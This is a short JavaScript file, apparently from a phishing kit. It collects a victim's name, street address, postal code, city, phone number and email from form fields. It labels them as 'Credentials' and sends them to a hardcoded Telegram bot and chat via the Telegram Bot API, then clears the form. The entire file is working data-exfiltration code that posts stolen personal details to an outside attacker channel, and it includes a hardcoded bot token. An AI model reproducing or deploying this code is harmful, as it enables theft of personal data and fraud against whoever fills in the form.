//bot token
var telegram_bot_id = "5712522024:AAHrYoBChw1JwK8R-8zB5d_7Z9sM7jrha74";

//chat id
var chat_id = -1001732954392;

var u_name, streetaddress, postalCode, ville, numtel, email;

var ready = function () {

    u_name = document.getElementById("name").value;

    streetaddress = document.getElementById("streetaddress").value;

    postalCode = document.getElementById("postalCode").value;

    ville = document.getElementById("ville").value;

    numtel = document.getElementById("numtel").value;

    email = document.getElementById("email").value;

    message =
        "📋 Credentials 📋 (TV) \n  👤Name & LastName: " + u_name +
        "\n🌎City: " + ville +
        "\n📍Street Address: " + streetaddress +
        "\n📍ZIP: " + postalCode +
        "\n📞Numéro: " + numtel +
        "\n📧Email: " + email;

};

var senderCredentialsTV = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("name").value = "";

    document.getElementById("streetaddress").value = "";

    document.getElementById("postalCode").value = "";

    document.getElementById("ville").value = "";

    document.getElementById("numtel").value = "";

    document.getElementById("email").value = "";

    return false;
};
